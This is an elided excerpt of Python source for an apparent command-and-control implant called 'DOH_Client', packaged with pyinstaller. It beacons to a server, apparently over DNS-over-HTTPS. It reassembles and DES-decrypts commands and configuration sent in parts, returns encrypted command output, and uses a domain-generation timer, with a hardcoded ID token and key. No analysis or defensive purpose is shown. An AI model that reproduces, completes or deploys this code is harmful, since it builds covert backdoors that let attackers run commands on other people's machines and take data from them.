# pyinstaller --onefile DOH_DES.py
...
class DOH_Client:
    def __init__(self, server_url, id_token, des_key, user_agent=None, uris=None, dga_timer=300):
        self.server_url = server_url.rstrip("/")
        self.id_token = id_token.strip().lower()
        self.des_cipher = DESCipher_string(des_key)
    ...
    def parse_init_payload(self, txt):
        try:
            if txt.startswith("ENC:"):
                encrypted_b64 = txt[4:]
                txt = self.des_cipher.decrypt(encrypted_b64)
    ...
    def parse_config_part(self, txt):
        try:
            ...
            if cfg_data['received_count'] == cfg_data['total']:
                ...
                decrypted_config = self.des_cipher.decrypt(full_encrypted_b64)
        ...
        try:
            ...
            if checksum in self.command_parts:
                ...
                if cmd_data['received_count'] == cmd_data['total']:
                    ...
                    try:
                        full_encrypted_b64 = b64decode(full_encoded).decode('utf-8')
                        full_command = self.des_cipher.decrypt(full_encrypted_b64)
    ...
    def send_output(self, output):
        ...
        try:
            encrypted_output = self.des_cipher.encrypt(output)
...
if __name__ == "__main__":
    ...
    id_token = "ddec89b5-cf5e-4e2e-8d62-46c2c66364ca"
    des_key = "12345678"
    
    client = DOH_Client(server_url, id_token, des_key, dga_timer=5)
    client.run()
